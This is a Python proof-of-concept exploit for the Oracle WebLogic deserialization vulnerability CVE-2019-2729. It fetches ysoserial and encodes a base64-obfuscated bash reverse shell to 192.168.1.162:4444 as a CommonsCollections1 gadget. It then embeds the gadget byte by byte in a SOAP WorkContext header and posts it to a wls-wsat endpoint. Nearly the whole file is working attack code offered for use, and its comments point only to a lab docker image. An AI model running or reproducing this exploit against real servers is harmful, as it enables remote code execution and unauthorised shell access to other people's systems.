#!/usr/bin/env python3
#
# CVE-2019-2729 POC
# https://hurricanelabs.com/blog/exploiting-cve-2019-2729-weblogic-deserialization-vulnerability/
# 
# this completed exploit by pizza-power
#
# exploit works with this docker image https://hub.docker.com/r/kkirsche/cve-2017-10271 
# which references a different, but simliar CVE. I haven't looked into the differences
# see also this repository https://github.com/kkirsche/CVE-2017-10271
#
# This may work for all of these CVEs, but it hasn't been tested
# 
# Usage: exploit.py
# it will download ysoserial as needed, but you'll have to add in your own payload

import requests
import os
import wget
import sys

# downloads ysoserial
ysoserial_link = "https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar"

if os.path.isfile("ysoserial-master-SNAPSHOT.jar") is False:
    try:
        print("Attempting to download ysoserial...")
        ysoserial = wget.download(ysoserial_link)
        
    except Exception as e:
        print("[-] " + e)
else:
    ysoserial = "ysoserial-master-SNAPSHOT.jar"

# use this to craft payload http://www.jackson-t.ca/runtime-exec-payloads.html
# this payload is a reverse shell to 192.168.1.162:4444
payload = "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTYyLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}"

print("[+] Using ysoserial to create payload...")
try:
    os.system(f"java -jar {ysoserial} CommonsCollections1 '{payload}' > payload")
except Exception as e:
    print("[-] " + e)

print("[+] Creating CVE payload...")

payload = open('payload', 'rb').read()

soap_payload = ""
soap_payload += '<?xml version="1.0" encoding="utf-8"?>\n'
soap_payload += '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">\n'
soap_payload += ' <soapenv:Header>\n'
soap_payload += '  <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">\n'
soap_payload += '   <java>\n'
soap_payload += '    <array method="forName">\n'
soap_payload += '     <string>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</string>\n'
soap_payload += '     <void>\n'
soap_payload += '      <array class="byte" length="%d">\n' % len(payload) 

for i in range(len(payload)):
    byte = payload[i]

    if byte >= 128:
        byte = -256 + byte

    soap_payload += '       <void index="%d">\n' % i
    soap_payload += '        <byte>%d</byte>\n' % byte
    soap_payload += '       </void>\n'

soap_payload += '      </array>\n'
soap_payload += '     </void>\n'
soap_payload += '    </array>\n'
soap_payload += '   </java>\n'
soap_payload += '  </work:WorkContext>\n'
soap_payload += ' </soapenv:Header>\n'
soap_payload += ' <soapenv:Body/>\n'
soap_payload += '</soapenv:Envelope>\n'

# now send the exploit
try:
    print("[+] sending malicious payload")
    address = "http://192.168.1.191:7001/wls-wsat/CoordinatorPortType"
    proxies = {"http": "http://127.0.0.1:9090", "https": "http://127.0.0.1:9090"}
    headers = {"SOAPAction":"", "Content-Type":"text/xml"}
    # set proxy as needed
    r = requests.post(address, data=soap_payload, proxies=None, headers=headers)
    if r.status_code == 500:
        print("[+] status code => 500 - likely success!")
    else:
        print("[-] Status code is not 500 - possible failure")
except Exception as e:
    print("[-] " + e)

sys.exit()
